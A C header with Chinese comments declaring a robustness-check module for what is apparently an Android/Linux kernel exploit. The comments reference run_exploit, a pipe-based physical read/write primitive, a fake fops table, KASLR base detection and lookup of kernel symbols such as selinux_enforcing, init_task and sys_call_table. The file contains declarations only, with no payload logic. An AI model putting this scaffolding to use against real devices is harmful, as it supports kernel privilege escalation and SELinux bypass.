#ifndef ROBUSTNESS_H
#define ROBUSTNESS_H

#include <stdint.h>

/*
 * 鲁棒性检查结果
 * Phase 1 (不需要 pipe 原语): version_match + kallsyms_resolved
 * Phase 2 (需要 pipe 原语):   fingerprint_ok + kaslr_range_ok + struct_liveness_ok
 */
typedef struct {
  int version_match;
  int fingerprint_ok;
  int kaslr_range_ok;
  int struct_liveness_ok;
  int kallsyms_resolved;
  int overall_pass;

  char detected_version[64];
  uint64_t detected_kbase;

  /* 动态解析的符号地址 (kallsyms 可读时填充) */
  uint64_t dyn_ashmem_fops;
  uint64_t dyn_init_task;
  uint64_t dyn_selinux_state;
  uint64_t dyn_kallsyms_lookup_name;
  uint64_t dyn_sys_call_table;
  uint64_t dyn_security_hook_heads;
  uint64_t dyn_km_malloc_caches;
  uint64_t dyn_anon_pipe_buf_ops;
  uint64_t dyn_empty_zero_page;
  uint64_t dyn_nfulnl_logger;
  uint64_t dyn_loggers;

  /* KASLR base (通过 _stext 或 __init_begin 查找) */
  uint64_t dyn_stext;

  /* task_group 及其他符号 */
  uint64_t dyn_root_task_group;
  uint64_t dyn_selinux_enforcing;

  /* fops 函数指针 (用于 put_fake_fops_table) */
  uint64_t dyn_ashmem_ioctl;
  uint64_t dyn_ashmem_compat_ioctl;
  uint64_t dyn_ashmem_mmap;
  uint64_t dyn_ashmem_open;
  uint64_t dyn_ashmem_release;
  uint64_t dyn_ashmem_show_fdinfo;
  uint64_t dyn_configfs_read_iter;
  uint64_t dyn_configfs_bin_write_iter;
  uint64_t dyn_copy_splice_read;
  uint64_t dyn_noop_llseek;
} robustness_result_t;

/*
 * Phase 1: 不依赖 pipe 原语的检查
 * 在 run_exploit 之前调用
 * 返回 0=可继续, 非0=应退出
 */
int robustness_check_phase1(robustness_result_t *result);

/*
 * Phase 2: 依赖 pipe 原语的检查
 * 在 install_pipe_physrw 之后调用
 * fd 为 pipe 物理读写 fd
 * 返回 0=全部通过, 非0=有警告但可继续
 */
int robustness_check_phase2(
    robustness_result_t *result, int fd, uint64_t kaslr_base);

/*
 * 获取硬编码版本字符串
 */
const char *robustness_expected_version(void);

/*
 * 通过 /proc/kallsyms 查找符号地址
 * 返回 0=未找到或受限
 */
uint64_t kallsyms_resolve(const char *name);

#endif /* ROBUSTNESS_H */
